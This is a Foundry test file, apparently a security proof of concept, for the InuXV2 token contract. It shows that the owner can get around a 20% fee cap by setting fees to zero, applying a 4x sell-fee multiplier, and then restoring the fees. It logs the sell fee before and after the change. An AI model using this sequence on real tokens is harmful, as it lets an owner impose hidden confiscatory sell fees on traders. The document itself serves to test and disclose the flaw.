// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/InuXV2.sol";

contract InuXFeeManipulationTest is Test {
    InuXV2 token;
    address owner = address(0xBEEF);
    address constant mockPair = address(0x1234);
    address user = address(0x1111);
    uint256 constant BLOCKS_SINCE_LAUNCH_THRESHOLD = 28800;
    address constant HARDCODED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    uint256 public sellAmount;
    uint256 public feePercentBefore;
    uint256 public feePercentAfter;

    function setUp() public {
        // Create mock addresses
        address mockFactory = address(0xABCD);
        address mockWETH = address(0xCDEF);
        
        // Mock router methods
        vm.mockCall(
            HARDCODED_ROUTER,
            abi.encodeWithSelector(IDexRouter.factory.selector),
            abi.encode(mockFactory)
        );
        vm.mockCall(
            HARDCODED_ROUTER,
            abi.encodeWithSelector(IDexRouter.WETH.selector),
            abi.encode(mockWETH)
        );
        // Mock factory method
        vm.mockCall(
            mockFactory, 
            abi.encodeWithSelector(IDexFactory.createPair.selector), 
            abi.encode(mockPair)
        );

        // Deploy token contract
        vm.startPrank(owner);
        token = new InuXV2();
        vm.stopPrank();
        
        // Advance blocks to pass initial protection period
        vm.roll(block.number + BLOCKS_SINCE_LAUNCH_THRESHOLD + 1);
    }

    function getEffectiveFee(uint256 preUser, uint256 prePair) internal returns (uint256) {
        vm.prank(user);
        token.transfer(mockPair, sellAmount);
        uint256 postUser = token.balanceOf(user);
        uint256 postPair = token.balanceOf(mockPair);
        uint256 feeAmount = (preUser - postUser) - (postPair - prePair);
        return feeAmount * 100 / sellAmount;
    }

    function test_FeeManipulation() public {
        // Setup: Prepare user for sell simulations
        uint8 decimals = token.decimals();
        sellAmount = 1000 * 10 ** decimals;
        
        // Transfer initial tokens to user
        vm.prank(owner);
        token.transfer(user, sellAmount * 100);

        // --- BEFORE-Trigger Sell Simulation ---
        console2.log("--- BEFORE-Trigger Sell Simulation ---");
        uint256 preUserBal = token.balanceOf(user);
        uint256 prePairBal = token.balanceOf(mockPair);
        feePercentBefore = getEffectiveFee(preUserBal, prePairBal);
        console2.log("Pre-Manipulation Effective Sell Fee: %s%%", feePercentBefore);
        
        // --- Trigger Vulnerability Steps ---
        console2.log("--- Trigger Vulnerability Steps ---");
        vm.startPrank(owner);
        // Step 1: Set minimal fees to bypass 20% buy fee limit
        token.setBuyFees(0, 0, 0, 0, 100);  // Total fees = 0% (allowed)
        // Step 2: Set high sell fee multiplier while fees are zero
        token.setSellFeeMultiplier(4, 1);  // 400% multiplier (passes when fees are 0)
        // Step 3: Set buy fees to maximum allowed (20%)
        token.setBuyFees(3, 5, 4, 8, 100);  // Total fees = 20% (still allowed)
        vm.stopPrank();

        // --- AFTER-Trigger Sell Simulation ---
        console2.log("--- AFTER-Trigger Sell Simulation ---");
        preUserBal = token.balanceOf(user);
        prePairBal = token.balanceOf(mockPair);
        feePercentAfter = getEffectiveFee(preUserBal, prePairBal);
        console2.log("Post-Manipulation Effective Sell Fee: %s%%", feePercentAfter);
        
        // Vulnerability determination
        bool vulnerabilityExists = feePercentAfter > 20;
        console2.log("Differential Change: %s%% -> %s%%", feePercentBefore, feePercentAfter);
        
        // Final verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Sell fee after manipulation exceeds 20%% limit (%s%%)", feePercentAfter);
        } else {
            console2.log("Vulnerability not Exist: Sell fee remains within 20%% limit (%s%%)", feePercentAfter);
        }
    }
}